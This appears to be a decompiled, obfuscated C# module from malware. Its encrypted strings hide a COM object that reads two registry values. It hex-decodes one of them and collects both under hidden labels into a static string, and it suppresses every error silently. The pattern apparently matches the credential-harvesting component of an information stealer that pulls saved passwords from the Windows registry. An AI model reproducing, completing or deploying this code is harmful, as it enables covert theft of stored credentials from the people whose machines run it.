using System;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns4;

namespace ns0;

internal class Class19
{
	public class Class20
	{
		public static void smethod_0()
		{
			try
			{
				string string_ = Class6.smethod_0("iKarxr6DsLi/pI6vxcKyha3CwM6mz93O0aW3r7q1lbfb4MSyycfaxJwH", "False");
				string string_2 = Class6.smethod_0("jKqvysKHtLzDqJKzyca2ibHGxNKq0+HS1am7s765mbva0ta31tnjx6AD", "False");
				string_0 = Class6.smethod_0("XXiDinxdeIOKfF14j7qVlXiDinxdeIOKfF14g4p8Jg==", "False") + Environment.NewLine + Class6.smethod_0("jMXC1sSYv8KEkFcQ", "False") + smethod_1(string_) + Environment.NewLine + Class6.smethod_0("aJSxuK6HpaJlcTgv", "False") + smethod_2(smethod_1(string_2));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string smethod_1(string string_0)
		{
			string result = default(string);
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class6.smethod_0("eZCrwaqSsXaiqYeptCc=", "False"), ""));
				object[] array = new object[1] { string_0 };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string smethod_2(string string_0)
		{
			string result = default(string);
			try
			{
				object obj = null;
				object obj2 = default(object);
				object obj3 = default(object);
				if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(string_0), (object)1, ref obj3, ref obj2))
				{
					do
					{
						object obj4 = Strings.Mid(string_0, Conversions.ToInteger(obj2), 2);
						obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)Class6.smethod_0("XboR", "False"), obj4))))));
						obj2 = Operators.AddObject(obj2, (object)1);
					}
					while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
